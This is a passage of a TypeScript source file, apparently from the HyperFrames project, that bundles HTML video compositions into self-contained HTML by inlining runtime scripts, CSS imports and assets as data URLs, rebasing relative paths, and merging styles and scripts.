import { createHash } from "node:crypto";
import {
  compositionStyle,
  cssStyleMergeKey,
  deferScriptsUntilFonts,
  isAlwaysAppliedStyle,
  headStyleRuns,
  INLINED_FILE_ATTR,
  inlineScriptRuns,
  styleElementsFor,
  type CompositionStyle,
} from "./scriptRuns";
import {
  countPageRoot,
  executableScripts,
  isJavaScriptType,
  planCompositionAssembly,
} from "./compositionAssembly";
import { SCENE_FONTS_ATTR, SCENE_PART_ATTR } from "../sceneParts";
import { stripSdrPngColourTags } from "./pngColourTags";
import {
  ensureExternalScriptTag,
  readExternalScriptAttributes,
  type ExternalScriptAttributes,
} from "./externalScripts";
import { emitMountedModuleScripts, parseImportMap, type ImportMap } from "./importMaps";
import { markFlattenedInnerRoot } from "../runtime/flattenedRoot";
export { FLATTENED_INNER_ROOT_STRIP_ATTRS } from "../runtime/flattenedRoot";
import { parseHostVariableValues, warnUnknownEnumValues } from "../runtime/getVariables";
import { sanitizeCssValue } from "../runtime/applyVariableBindings";
import { cssVariableName } from "../tokenSlug";
import { AsyncLocalStorage } from "async_hooks";
import { readFileSync, existsSync, statSync } from "fs";
import { parse as parseJs } from "acorn";
import { resolve, relative, dirname, isAbsolute, sep } from "path";
import { extractStandaloneEntryFromIndex, isTemplateEntry } from "./standaloneEntry";
import {
  decodeCssEscapes,
  decodeWellFormedEscapes,
  encodeUrlPath,
  decodedUrlPath,
  splitUrlSuffix,
} from "@hyperframes/parsers/asset-paths";
import { CSS_URL_RE, isNonRelativeUrl } from "./assetPaths.js";
import { rewriteSrcsetUrls } from "./srcset.js";
import { compileHtml, type MediaDurationProber } from "./htmlCompiler";
import {
  RUNTIME_BOOTSTRAP_ATTR,
  escapeInlineScriptSource,
  insertRuntimeTag,
  parseHTMLContent,
  stripEmbeddedRuntimeScripts,
} from "./htmlDocument";
// rewriteSubCompPaths functions are used by inlineSubCompositions (shared module)
import {
  emitVariablesByCompScript,
  dedupeFontFaceRules,
  hoistFontFaceRules,
  scopeCssToComposition,
  wrapInlineScriptWithErrorBoundary,
  scopedModulePrelude,
  wrapScopedCompositionScript,
} from "./compositionScoping";
import { validateHyperframeHtmlContract } from "./staticGuard";
import { getHyperframeRuntimeScript } from "../generated/runtime-inline";
import { readDeclaredDefaults } from "../runtime/getVariables";
import {
  ensureExternalLinkTag,
  inlineSubCompositions,
  isLibraryCopy,
  refuseSwapsReachedByRootScripts,
} from "./inlineSubCompositions";
import { isSafePath, resolveWithinProject } from "../safePath.js";
import { ensureHfIds } from "@hyperframes/parsers/hf-ids";
import { HF_COLOR_GRADING_ATTR } from "../colorGrading";
import { assignMediaRenderIds } from "./mediaRenderIds";

const DEFAULT_RUNTIME_SCRIPT_URL = "";

function getRuntimeScriptUrl(): string {
  const configured = (process.env.HYPERFRAME_RUNTIME_URL || "").trim();
  return configured || DEFAULT_RUNTIME_SCRIPT_URL;
}

function injectInterceptor(html: string, runtimeMode: "inline" | "placeholder" = "inline"): string {
  const sanitized = stripEmbeddedRuntimeScripts(html);

  // Three modes for the runtime <script>:
  //   1. HYPERFRAME_RUNTIME_URL env var set → emit src="<url>" (production CDN deploy).
  //   2. runtime: "placeholder" passed         → emit src="" for the caller to substitute
  //                                              (studio + vite preview hot-load a local
  //                                              runtime endpoint via string replace).
  //   3. runtime: "inline" (default)           → embed the IIFE body directly so the
  //                                              bundle is genuinely self-contained.
  const runtimeScriptUrl = getRuntimeScriptUrl();
  let tag: string;
  if (runtimeScriptUrl) {
    const escaped = runtimeScriptUrl.replace(/"/g, "&quot;");
    tag = `<script ${RUNTIME_BOOTSTRAP_ATTR}="1" src="${escaped}"></script>`;
  } else if (runtimeMode === "placeholder") {
    tag = `<script ${RUNTIME_BOOTSTRAP_ATTR}="1" src=""></script>`;
  } else {
    const inlinedRuntime = getHyperframeRuntimeScript();
    tag = `<script ${RUNTIME_BOOTSTRAP_ATTR}="1">${inlinedRuntime}</script>`;
  }
  return insertRuntimeTag(sanitized, tag);
}

function isRelativeUrl(url: string): boolean {
  return !isNonRelativeUrl(url) && !isAbsolute(url);
}

const bundleReads = new AsyncLocalStorage<(filePath: string) => void>();

function noteRead(filePath: string): void {
  bundleReads.getStore()?.(filePath);
}

function safeReadFile(filePath: string): string | null {
  noteRead(filePath);
  if (!existsSync(filePath)) return null;
  try {
    return readFileSync(filePath, "utf-8");
  } catch {
    return null;
  }
}

const CSS_IMPORT_RE =
  /@import\s+(?:url\(\s*(["']?)([^)"']+)\1\s*\)|(["'])([^"']+)\3)\s*([^;]*);\s*/g;

const CSS_COMMENT_RE = /\/\*[\s\S]*?\*\//g;

function withCommentsStripped<T>(
  css: string,
  fn: (stripped: string) => T,
): { result: T; restore: (s: string) => string } {
  const comments: string[] = [];
  const stripped = css.replace(CSS_COMMENT_RE, (m) => {
    const idx = comments.length;
    comments.push(m);
    return `/*__hf_c${idx}__*/`;
  });
  const result = fn(stripped);
  const restore = (s: string) => {
    let out = s;
    for (let i = 0; i < comments.length; i++) {
      out = out.replace(`/*__hf_c${i}__*/`, comments[i]!);
    }
    return out;
  };
  return { result, restore };
}

function resolveRelativeUrlPath(fromDir: string, basePath: string): string {
  return resolve(fromDir, decodeWellFormedEscapes(basePath.replaceAll("\\", "/")));
}

function rebaseCssUrls(css: string, cssFileDir: string, projectDir: string): string {
  const resolvedRoot = resolve(projectDir);
  const resolvedDir = resolve(cssFileDir);
  if (resolvedDir === resolvedRoot) return css;
  return css.replace(CSS_URL_RE, (full, quote: string, urlValue: string) => {
    const decoded = decodeCssEscapes(urlValue);
    if (!decoded || !isRelativeUrl(decoded)) return full;
    const { basePath, suffix } = splitUrlSuffix(decoded);
    if (!basePath) return full;
    const absolutePath = resolveRelativeUrlPath(resolvedDir, basePath);
    const rebased = encodeUrlPath(relative(resolvedRoot, absolutePath).split(sep).join("/"));
    if (rebased === basePath) return full;
    const escapedSuffix = suffix.replace(
      /[\s\p{Cc}"'()\\<>]/gu,
      (char) => `\\${char.codePointAt(0)!.toString(16).padStart(6, "0")}`,
    );
    return `url(${quote || ""}${rebased}${escapedSuffix}${quote || ""})`;
  });
}

function rebaseRelativePath(urlValue: string, fromDir: string, toDir: string): string {
  const { basePath, suffix } = splitUrlSuffix(urlValue.trim());
  if (!basePath) return urlValue;
  const absolutePath = resolveRelativeUrlPath(fromDir, basePath);
  const rebased = encodeUrlPath(relative(resolve(toDir), absolutePath).split(sep).join("/"));
  return appendSuffixToUrl(rebased, suffix);
}

function rebaseColorGradingLutPath(value: string, fromDir: string, toDir: string): string {
  if (!value.trim().startsWith("{")) return value;
  let parsed: unknown;
  try {
    parsed = JSON.parse(value);
  } catch {
    return value;
  }
  if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) return value;

  const lut = Reflect.get(parsed, "lut");
  if (typeof lut === "string") {
    if (!isRelativeUrl(lut)) return value;
    Reflect.set(parsed, "lut", rebaseRelativePath(lut, fromDir, toDir));
    return JSON.stringify(parsed);
  }
  if (typeof lut !== "object" || lut === null || Array.isArray(lut)) return value;
  const lutSrc = Reflect.get(lut, "src");
  if (typeof lutSrc !== "string" || !isRelativeUrl(lutSrc)) return value;
  Reflect.set(lut, "src", rebaseRelativePath(lutSrc, fromDir, toDir));
  return JSON.stringify(parsed);
}

function rebaseEntryAuthoredAssetPaths(
  document: Document,
  sourceDir: string,
  projectDir: string,
): void {
  for (const styleEl of [...document.querySelectorAll("style")]) {
    styleEl.textContent = rebaseCssUrls(styleEl.textContent || "", sourceDir, projectDir);
  }
  for (const el of [...document.querySelectorAll("[style]")]) {
    const styleAttr = el.getAttribute("style");
    if (styleAttr) el.setAttribute("style", rebaseCssUrls(styleAttr, sourceDir, projectDir));
  }
  for (const el of [...document.querySelectorAll("[src], [href], [poster], [xlink\\:href]")]) {
    if (el.tagName === "LINK" && (el.getAttribute("rel") || "").toLowerCase() === "stylesheet")
      continue;
    if (el.tagName === "SCRIPT" && el.hasAttribute("src")) continue;
    for (const attr of ["src", "href", "poster", "xlink:href"] as const) {
      const value = el.getAttribute(attr);
      if (!value || !isRelativeUrl(value)) continue;
      el.setAttribute(attr, rebaseRelativePath(value, sourceDir, projectDir));
    }
  }
  for (const el of [...document.querySelectorAll("[srcset]")]) {
    const srcset = el.getAttribute("srcset");
    if (srcset)
      el.setAttribute(
        "srcset",
        rewriteSrcsetUrls(srcset, (url) =>
          isRelativeUrl(url) ? rebaseRelativePath(url, sourceDir, projectDir) : url,
        ),
      );
  }
  for (const el of [...document.querySelectorAll(`[${HF_COLOR_GRADING_ATTR}]`)]) {
    const value = el.getAttribute(HF_COLOR_GRADING_ATTR);
    if (value)
      el.setAttribute(
        HF_COLOR_GRADING_ATTR,
        rebaseColorGradingLutPath(value, sourceDir, projectDir),
      );
  }
}

function inlineCssFile(
  css: string,
  cssFileDir: string,
  projectDir: string,
  activeImports: Set<string>,
): string {
  const { result: strippedCss, restore: restoreComments } = withCommentsStripped(css, (s) => s);
  const importPlaceholders: string[] = [];
  const withPlaceholders = strippedCss.replace(
    CSS_IMPORT_RE,
    (full, _q1, urlPath, _q2, barePath, mediaQuery) => {
      const importPath = urlPath ?? barePath;
      if (!importPath || !isRelativeUrl(importPath)) return full;
      const resolved = resolve(cssFileDir, decodedUrlPath(importPath));
      // @import is resolved relative to the CSS file, but must stay within the
      // project root; isSafePath also blocks symlink escapes (content is inlined).
      if (!isSafePath(projectDir, resolved)) return full;
      if (activeImports.has(resolved)) return "";
      const content = safeReadFile(resolved);
      if (content == null) return full;
      activeImports.add(resolved);
      const inlined = inlineCssFile(content, dirname(resolved), projectDir, activeImports);
      activeImports.delete(resolved);
      const trimmedMedia = (mediaQuery || "").trim();
      const block = trimmedMedia ? `@media ${trimmedMedia} {\n${inlined}\n}\n` : inlined + "\n";
      const idx = importPlaceholders.length;
      importPlaceholders.push(block);
      return `/*__hf_import_${idx}__*/`;
    },
  );
  let rebased = rebaseCssUrls(withPlaceholders, cssFileDir, projectDir);
  rebased = restoreComments(rebased);
  for (let i = 0; i < importPlaceholders.length; i++) {
    rebased = rebased.replace(`/*__hf_import_${i}__*/`, importPlaceholders[i]!);
  }
  return rebased;
}

function safeReadFileBuffer(filePath: string): Buffer | null {
  noteRead(filePath);
  if (!existsSync(filePath)) return null;
  try {
    return readFileSync(filePath);
  } catch {
    return null;
  }
}

function appendSuffixToUrl(baseUrl: string, suffix: string): string {
  if (!suffix) return baseUrl;
  if (suffix.startsWith("#")) return `${baseUrl}${suffix}`;
  if (suffix.startsWith("?")) {
    const queryWithOptionalHash = suffix.slice(1);
    if (!queryWithOptionalHash) return baseUrl;
    const hashIdx = queryWithOptionalHash.indexOf("#");
    const queryPart =
      hashIdx >= 0 ? queryWithOptionalHash.slice(0, hashIdx) : queryWithOptionalHash;
    const hashPart = hashIdx >= 0 ? queryWithOptionalHash.slice(hashIdx) : "";
    if (!queryPart) return `${baseUrl}${hashPart}`;
    const joiner = baseUrl.includes("?") ? "&" : "?";
    return `${baseUrl}${joiner}${queryPart}${hashPart}`;
  }
  return baseUrl;
}

const INLINE_MIME: Record<string, string> = {
  ".svg": "image/svg+xml",
  ".json": "application/json",
  ".txt": "text/plain",
  ".cube": "text/plain",
  ".xml": "application/xml",
  // Fonts and raster images. A bundle handed to a consumer that stores it as a
  // lone object — no sibling `assets/` directory — 404s on every surviving
  // relative reference, and a missing font silently reflows the whole frame
  // rather than failing loudly. Media (mp4/webm/mp3/wav) is deliberately absent:
  // it is large, streamed rather than laid out, and its absence is obvious.
  ".woff2": "font/woff2",
  ".woff": "font/woff",
  ".ttf": "font/ttf",
  ".otf": "font/otf",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".gif": "image/gif",
  ".webp": "image/webp",
  ".avif": "image/avif",
};

/**
 * Per-asset ceiling on base64 inlining.
 *
 * Base64 costs ~33% over the raw bytes, so an unbounded rule turns one careless
 * 40 MB asset into a bundle no browser should be asked to parse. 2 MiB is
 * measured against this repo's own assets rather than picked: the largest of
 * 164 tracked `.woff2` files is 105 KB (p90 75 KB) and the largest of 284
 * tracked raster images is 2.00 MB (p90 437 KB). So every font and effectively
 * every image in-tree inlines, while a video-sized file cannot.
 *
 * Oversized assets keep their project-relative URL — correct wherever the
 * bundle is served from its project directory, and warned about because that is
 * exactly where "self-contained" stops being true.
 */
const MAX_INLINE_ASSET_BYTES = 2 * 1024 * 1024;

// An asset is inlined once per reference, so repeats can pass V8's ~2^29-char string limit.
const MAX_INLINED_BUNDLE_CHARS = 256 * 1024 * 1024;

function safeStatSize(filePath: string): number | null {
  try {
    return statSync(filePath).size;
  } catch {
    return null;
  }
}

function warnAssetTooLargeToInline(assetPath: string, byteLength: number): void {
  const mb = (byteLength / (1024 * 1024)).toFixed(1);
  console.warn(
    `[HyperFrames] Not inlining "${assetPath}" (${mb} MB exceeds the ${MAX_INLINE_ASSET_BYTES / (1024 * 1024)} MB inline limit). The bundle may not be self-contained.`,
  );
}

function warnInlineBudgetExhausted(assetPath: string): void {
  console.warn(
    `[HyperFrames] Not inlining "${assetPath}" and later assets: the bundle already inlines ${MAX_INLINED_BUNDLE_CHARS / (1024 * 1024)} MB of data URLs. The bundle may not be self-contained.`,
  );
}

type AssetInliner = (urlValue: string) => string | null;
type InlinableAsset = { dataUrl: string | null } | { tooLarge: number };

/** Inlines relative asset URLs as data: URLs, reading each project file once per build. */
function createAssetInliner(
  resolveProjectPath: (relativePath: string) => string | null,
  inlineAssets: boolean,
): AssetInliner {
  const assets = new Map<string, InlinableAsset>();
  let inlinedChars = 0;
  let budgetExhausted = false;
  const readAsset = (filePath: string, mimeType: string): InlinableAsset => {
    // Size-check before reading: an oversized asset must not be pulled into memory
    // just to be discarded.
    const byteLength = safeStatSize(filePath);
    if (byteLength !== null && byteLength > MAX_INLINE_ASSET_BYTES) return { tooLarge: byteLength };
    const read = safeReadFileBuffer(filePath);
    const content = read && mimeType === "image/png" ? (stripSdrPngColourTags(read) ?? read) : read;
    return {
      dataUrl: content === null ? null : `data:${mimeType};base64,${content.toString("base64")}`,
    };
  };
  return (urlValue) => {
    if (!inlineAssets) return null;
    if (!urlValue || !isRelativeUrl(urlValue)) return null;
    const { basePath, suffix } = splitUrlSuffix(urlValue.trim());
    if (!basePath) return null;
    const filePath = resolveProjectPath(decodeWellFormedEscapes(basePath));
    if (!filePath) return null;
    const ext = filePath.toLowerCase().match(/\.[^.]+$/)?.[0] ?? "";
    const mimeType = INLINE_MIME[ext];
    if (!mimeType) return null;
    let asset = assets.get(filePath);
    if (asset === undefined) {
      asset = readAsset(filePath, mimeType);
      assets.set(filePath, asset);
    } else if ("dataUrl" in asset) {
      noteRead(filePath);
    }
    if ("tooLarge" in asset) {
      warnAssetTooLargeToInline(basePath, asset.tooLarge);
      return null;
    }
    if (asset.dataUrl === null) return null;
    if (budgetExhausted || inlinedChars + asset.dataUrl.length > MAX_INLINED_BUNDLE_CHARS) {
      if (!budgetExhausted) warnInlineBudgetExhausted(basePath);
      budgetExhausted = true;
      return null;
    }
    inlinedChars += asset.dataUrl.length;
    const hashIdx = suffix.indexOf("#");
    return hashIdx < 0 ? asset.dataUrl : `${asset.dataUrl}${suffix.slice(hashIdx)}`;
  };
}

function isExternalSvgFragmentUse(el: Element, attr: string, urlValue: string): boolean {
  if (el.tagName.toLowerCase() !== "use") return false;
  if (attr !== "href" && attr !== "xlink:href") return false;
  if (!isRelativeUrl(urlValue)) return false;
  const hashIdx = urlValue.indexOf("#");
  if (hashIdx <= 0) return false;
  const pathBeforeFragment = urlValue.slice(0, hashIdx).split("?", 1)[0] ?? "";
  return pathBeforeFragment.toLowerCase().endsWith(".svg");
}

function warnColorGradingLutNotInlined(lutSrc: string): void {
  const trimmed = lutSrc.trim();
  if (!isRelativeUrl(trimmed)) return;
  console.warn(
    `[HyperFrames] Could not inline color grading LUT "${trimmed}". The rendered bundle may not be self-contained.`,
  );
}

// fallow-ignore-next-line complexity
function rewriteColorGradingLutWithInlinedAssets(value: string, inlineAsset: AssetInliner): string {
  if (!value.trim().startsWith("{")) return value;
  let parsed: unknown;
  try {
    parsed = JSON.parse(value);
  } catch {
    return value;
  }
  if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) return value;

  const lut = Reflect.get(parsed, "lut");
  if (typeof lut === "string") {
    // Gated by inlineAssets and inlineColorGradingLuts at the call site above;
    // this call only runs once both have already passed.
    const inlined = inlineAsset(lut);
    if (!inlined) {
      warnColorGradingLutNotInlined(lut);
      return value;
    }
    Reflect.set(parsed, "lut", inlined);
    return JSON.stringify(parsed);
  }
  if (typeof lut !== "object" || lut === null || Array.isArray(lut)) return value;
  const lutSrc = Reflect.get(lut, "src");
  if (typeof lutSrc !== "string") return value;
  const inlined = inlineAsset(lutSrc);
  if (!inlined) {
    warnColorGradingLutNotInlined(lutSrc);
    return value;
  }
  Reflect.set(lut, "src", inlined);
  return JSON.stringify(parsed);
}

function rewriteCssUrlsWithInlinedAssets(cssText: string, inlineAsset: AssetInliner): string {
  if (!cssText) return cssText;
  return cssText.replace(
    /\burl\(\s*(["']?)([^)"']+)\1\s*\)/g,
    (_full, quote: string, rawUrl: string) => {
      const maybeInlined = inlineAsset((rawUrl || "").trim());
      if (!maybeInlined) return _full;
      return `url(${quote || ""}${maybeInlined}${quote || ""})`;
    },
  );
}

/**
 * Selectors built here are serialized inside a `<style>` element, which is a RAW
 * TEXT element: the tokenizer ends it at the first `</style` regardless of CSS
 * context, and the serializer does not escape its content. Backslash and quote
 * escaping keeps the selector's own string grammar valid; it does nothing about
 * element termination, so `<` needs the CSS hex escape too. `\3c ` is legal
 * wherever a string is, and matches the same attribute value, so selectors keep
 * matching. The trailing space terminates the escape.
 */
function cssAttributeSelector(attr: string, value: string): string {
  const escaped = value.replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/</g, "\\3c ");
  return `[${attr}="${escaped}"]`;
}

function uniqueCompositionId(baseId: string, index: number): string {
  return `${baseId}__hf${index}`;
}

export type BundledHostCompositionIdentity = {
  authoredCompositionId: string | null;
  runtimeCompositionId: string | null;
};

function getBundledHostCompositionIdentity(host: Element): BundledHostCompositionIdentity {
  const currentCompositionId = (host.getAttribute("data-composition-id") || "").trim() || null;
  const authoredCompositionId =
    (host.getAttribute("data-hf-original-composition-id") || currentCompositionId || "").trim() ||
    null;
  return {
    authoredCompositionId,
    runtimeCompositionId: currentCompositionId,
  };
}

function getBundledTrackedCompositionHosts(document: Document): Element[] {
  const hosts = Array.from(
    document.querySelectorAll<Element>("[data-composition-src], [data-composition-id]"),
  );
  return hosts.filter((host) => {
    if (host.hasAttribute("data-composition-src")) return true;
    const authoredCompositionId = getBundledHostCompositionIdentity(host).authoredCompositionId;
    if (!authoredCompositionId) return false;
    return !!document.getElementById(`${authoredCompositionId}-template`);
  });
}

function shouldAssignBundledRuntimeCompositionId(host: Element, document: Document): boolean {
  if (host.hasAttribute("data-composition-src")) return true;
  const authoredCompositionId = getBundledHostCompositionIdentity(host).authoredCompositionId;
  if (!authoredCompositionId) return false;
  if (!document.getElementById(`${authoredCompositionId}-template`)) return false;
  return host.children.length === 0;
}

function countBundledAuthoredCompositionIds(hosts: Element[]): Map<string, number> {
  const counts = new Map<string, number>();
  for (const host of hosts) {
    const authoredCompositionId = getBundledHostCompositionIdentity(host).authoredCompositionId;
    if (!authoredCompositionId) continue;
    counts.set(authoredCompositionId, (counts.get(authoredCompositionId) || 0) + 1);
  }
  countPageRoot(counts, hosts);
  return counts;
}

// fallow-ignore-next-line complexity
export function assignBundledRuntimeCompositionIds(
  hosts: Element[],
  counts: Map<string, number> = countBundledAuthoredCompositionIds(hosts),
): Map<Element, BundledHostCompositionIdentity> {
  const instanceByCompositionId = new Map<string, number>();
  const identities = new Map<Element, BundledHostCompositionIdentity>();

  for (const host of hosts) {
    const { authoredCompositionId, runtimeCompositionId: previousRuntimeCompositionId } =
      getBundledHostCompositionIdentity(host);
    const shouldAssign = shouldAssignBundledRuntimeCompositionId(host, host.ownerDocument);
    if (!authoredCompositionId) {
      identities.set(host, {
        authoredCompositionId: null,
        runtimeCompositionId: previousRuntimeCompositionId,
      });
      continue;
    }

    const duplicateInstance = (counts.get(authoredCompositionId) || 0) > 1;
    let runtimeCompositionId = previousRuntimeCompositionId || authoredCompositionId;
    if (shouldAssign) {
      const instanceIndex = duplicateInstance
        ? (instanceByCompositionId.get(authoredCompositionId) || 0) + 1
        : 0;
      if (duplicateInstance) {
        instanceByCompositionId.set(authoredCompositionId, instanceIndex);
        host.setAttribute("data-hf-original-composition-id", authoredCompositionId);
      } else {
        host.removeAttribute("data-hf-original-composition-id");
      }

      runtimeCompositionId = duplicateInstance
        ? uniqueCompositionId(authoredCompositionId, instanceIndex)
        : authoredCompositionId;
      host.setAttribute("data-composition-id", runtimeCompositionId);
    }
    identities.set(host, {
      authoredCompositionId,
      runtimeCompositionId,
    });
  }

  return identities;
}

export function prepareFlattenedInnerRoot(innerRoot: Element): Element {
  const prepared = innerRoot.cloneNode(true) as Element;
  markFlattenedInnerRoot(prepared);
  const w = prepared.getAttribute("data-width");
  const h = prepared.getAttribute("data-height");
  const widthVal = w ? `${w}px` : "100%";
  const heightVal = h ? `${h}px` : "100%";
  const existingStyle = (prepared.getAttribute("style") || "").trim();
  const fill = `width:${widthVal};height:${heightVal}`;
  prepared.setAttribute("style", existingStyle ? `${existingStyle};${fill}` : fill);
  return prepared;
}

function enforceCompositionPixelSizing(document: Document): void {
  const compositionEls = [
    ...document.querySelectorAll("[data-composition-id][data-width][data-height]"),
  ];
  if (compositionEls.length === 0) return;
  const sizeMap = new Map<string, { w: number; h: number }>();
  for (const el of compositionEls) {
    const compId = el.getAttribute("data-composition-id");
    const w = Number(el.getAttribute("data-width"));
    const h = Number(el.getAttribute("data-height"));
    if (compId && Number.isFinite(w) && Number.isFinite(h) && w > 0 && h > 0) {
      sizeMap.set(compId, { w, h });
    }
  }
  if (sizeMap.size === 0) return;
  for (const styleEl of document.querySelectorAll("style")) {
    let css = styleEl.textContent || "";
    let modified = false;
    for (const [compId, { w, h }] of sizeMap) {
      const escaped = compId.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      const blockRe = new RegExp(
        `(\\[data-composition-id=["']${escaped}["']\\]\\s*\\{)([^}]*)(})`,
        "g",
      );
      css = css.replace(blockRe, (_, open, body, close) => {
        const newBody = body
          .replace(/(\bwidth\s*:\s*)100%/g, `$1${w}px`)
          .replace(/(\bheight\s*:\s*)100%/g, `$1${h}px`);
        if (newBody !== body) modified = true;
        return open + newBody + close;
      });
    }
    if (modified) styleEl.textContent = css;
  }
}

function autoHealMissingCompositionIds(document: Document): void {
  const compositionIdRe = /data-composition-id=["']([^"']+)["']/gi;
  const referencedIds = new Set<string>();
  for (const el of document.querySelectorAll("style, script")) {
    const text = (el.textContent || "").trim();
    if (!text) continue;
    let match: RegExpExecArray | null;
    while ((match = compositionIdRe.exec(text)) !== null) {
      const compId = (match[1] || "").trim();
      if (compId) referencedIds.add(compId);
    }
  }
  if (referencedIds.size === 0) return;

  const existingIds = new Set<string>();
  for (const el of document.querySelectorAll("[data-composition-id]")) {
    const id = (el.getAttribute("data-composition-id") || "").trim();
    if (id) existingIds.add(id);
  }

  for (const compId of referencedIds) {
    if (compId === "root" || existingIds.has(compId)) continue;
    const candidates = [`${compId}-layer`, `${compId}-comp`, compId];
    for (const targetId of candidates) {
      const found = document.getElementById(targetId);
      if (found && !found.getAttribute("data-composition-id")) {
        found.setAttribute("data-composition-id", compId);
        break;
      }
    }
  }
}

/** Join stylesheets into one, moving every distinct `@import` to the front, where CSS allows it. */
function joinCssHoistingImports(sheets: string[]): string {
  const imports = new Set<string>();
  const cssParts: string[] = [];
  for (const sheet of sheets) {
    const rest = sheet.trim().replace(CSS_IMPORT_RE, (match) => {
      imports.add(match.trim());
      return "";
    });
    if (rest.trim()) cssParts.push(rest.trim());
  }
  return [...imports, ...cssParts].join("\n\n").trim();
}

// A render joins every head style into one sheet at the first one's place, each distinct @import first.
function placeSceneStylesLikeRender(document: Document): void {
  const styles = [...document.querySelectorAll("head style")];
  const imports = new Set<string>();
  for (const el of styles) {
    el.textContent = (el.textContent || "")
      .replace(CSS_IMPORT_RE, (match) => (imports.add(match.trim()), ""))
      .trim();
  }
  styles.slice(1).reduce((previous, el) => (previous.after(el), el), styles[0]!);
  if (imports.size === 0) return;
  const hoisted = [...imports].join("\n\n");
  const first = styles[0]!;
  if (!first.hasAttribute(SCENE_PART_ATTR)) {
    first.textContent = [hoisted, first.textContent].filter(Boolean).join("\n\n");
    return;
  }
  const holder = document.createElement("style");
  holder.textContent = hoisted;
  first.before(holder);
}

type PartRun<T> = { scene?: string; chunks: T[] };

function pushRun<T>(runs: PartRun<T>[], scene: string | undefined, chunk: T): void {
  const last = runs.at(-1);
  if (last && last.scene === scene) last.chunks.push(chunk);
  else runs.push({ scene, chunks: [chunk] });
}

async function coalesceHeadStylesAndBodyScripts(
  document: Document,
  provenance?: BundleOptions["scriptProvenance"],
): Promise<void> {
  const allHeadStyles = [...document.querySelectorAll("head style")];
  const isScenePart = (el: Element) => el.hasAttribute(SCENE_PART_ATTR);
  for (const run of allHeadStyles.length > 1 ? headStyleRuns(allHeadStyles, isScenePart) : []) {
    const merged = joinCssHoistingImports(run.map((el) => el.textContent || ""));
    if (!merged) continue;
    run[0]!.textContent = merged;
    for (const el of run.slice(1)) el.remove();
  }
  if (allHeadStyles.some(isScenePart)) placeSceneStylesLikeRender(document);

  const isPinned = (el: Element) =>
    el.hasAttribute(RUNTIME_BOOTSTRAP_ATTR) || el.hasAttribute(SCENE_PART_ATTR);
  for (const { members, anchor } of inlineScriptRuns(
    [...document.querySelectorAll("body script")],
    isPinned,
  )) {
    const mergedJs = joinJsChunks(members.map((el) => el.textContent || ""));
    if (mergedJs && !parsesAsScript(mergedJs)) {
      for (const el of members)
        el.textContent = await inlineScriptSource(el.textContent || "", provenance);
      continue;
    }
    for (const el of members) el.remove();
    if (!mergedJs) continue;
    const inlineScript = document.createElement("script");
    inlineScript.textContent = await inlineScriptSource(mergedJs, provenance);
    if (anchor) anchor.before(inlineScript);
    else document.body.appendChild(inlineScript);
  }
}

/**
 * Force subpixel glyph positioning so headless rendering paths
 * (chrome-headless-shell with BeginFrame) lay text out identically to full
 * Chrome. `text-rendering: auto` resolves to `optimizeSpeed` (integer glyph
 * advances) in headless-shell but `geometricPrecision` in full Chrome, which
 * shifts line-wrap points and any animation that reads measured text width.
 * Mirrors the producer's `injectTextRenderingRule` so bundled previews and
 * compiled renders stay byte-aligned. `*` has zero specificity, so authored
 * class/id rules still override.
 */
function injectTextRenderingRule(document: Document): void {
  const head = document.head;
  if (!head) return;
  if (document.querySelector("style[data-hyperframes-text-rendering]")) return;

  const styleEl = document.createElement("style");
  styleEl.setAttribute("data-hyperframes-text-rendering", "true");
  styleEl.textContent = "html,body,*{text-rendering:geometricPrecision}";
  head.insertBefore(styleEl, head.firstChild);
}

/**
 * Concatenate JS chunks safely. Goals:
 *   - Each chunk's last statement is terminated, so joining can't introduce ASI
 *     surprises (e.g. `a()` followed by `(b)()` — the second chunk would parse
 *     as a call on the first's return value).
 *   - In the common case (chunk already ends with `;` — typical of esbuild
 *     output and IIFE-wrapped composition scripts ending in `})();`), the join
 *     produces clean output: chunks separated by `\n` with no stray bare
 *     semicolon lines.
 *   - Defensive against trailing line comments. If a chunk ends with `// ...`
 *     and we appended `;` on the same line, the appended semicolon would be
 *     swallowed by the comment, leaving the next chunk's first statement
 *     attached to the previous chunk's last expression — exactly the ASI
 *     hazard this helper exists to prevent. So when a chunk doesn't already
 *     end in `;`, we append `\n;` instead — the newline closes any line
 *     comment, and the standalone `;` becomes the statement separator.
 */
function joinJsChunks(chunks: string[]): string {
  return chunks
    .map((chunk) => chunk.trim())
    .filter((chunk) => chunk.length > 0)
    .map((chunk) => (chunk.endsWith(";") ? chunk : chunk + "\n;"))
    .join("\n");
}

// acorn in script mode, not the host engine: Bun 1.3's vm.Script compiles lazily and accepts anything.
// esbuild accepts export, top-level await and return, which a <script> rejects; acorn does not.
export function parsesAsScript(source: string): boolean {
  try {
    parseJs(source, { ecmaVersion: "latest", sourceType: "script" });
    return true;
  } catch {
    return false;
  }
}

async function stripJsCommentsParserSafe(
  source: string,
  provenance?: BundleOptions["scriptProvenance"],
): Promise<string> {
  if (!source) return source;
  const { transform } = await import("esbuild");
  try {
    const result = await transform(source, {
      loader: "js",
      minify: false,
      legalComments: "none",
      ...(provenance
        ? { sourcemap: "external" as const, sourcefile: "hf-authored-bundle.js" }
        : {}),
    });
    if (provenance) {
      const sourceURL = `hf-inspect-${createHash("sha256").update(source).digest("hex")}.js`;
      provenance({ input: source, output: result.code.trim(), sourceMap: result.map, sourceURL });
      return `${result.code.trim()}\n//# sourceURL=${sourceURL}`;
    }
    return result.code.trim();
  } catch {
    return source;
  }
}

async function inlineScriptSource(
  js: string,
  provenance?: BundleOptions["scriptProvenance"],
): Promise<string> {
  return escapeInlineScriptSource(await stripJsCommentsParserSafe(js, provenance));
}

export interface BundleScriptProvenance {
  input: string;
  output: string;
  sourceMap: string;
  sourceURL?: string;
}

export interface BundleOptions {
  /** Optional source mapping for inspection; does not alter bundled HTML. */
  scriptProvenance?: (script: BundleScriptProvenance) => void;
  /** Project-relative HTML entry to bundle. Defaults to `index.html`. */
  entryFile?: string;
  stampHfIds?: boolean;
  /** Optional media duration prober (e.g., ffprobe). If omitted, media durations are not resolved. */
  probeMediaDuration?: MediaDurationProber;
  /**
   * How to handle the HyperFrames runtime <script> tag. Default: `"inline"`.
   *
   * - `"inline"` — embed the runtime IIFE body directly into the bundle. Produces
   *   genuinely self-contained HTML. Right for CLI render output, validate,
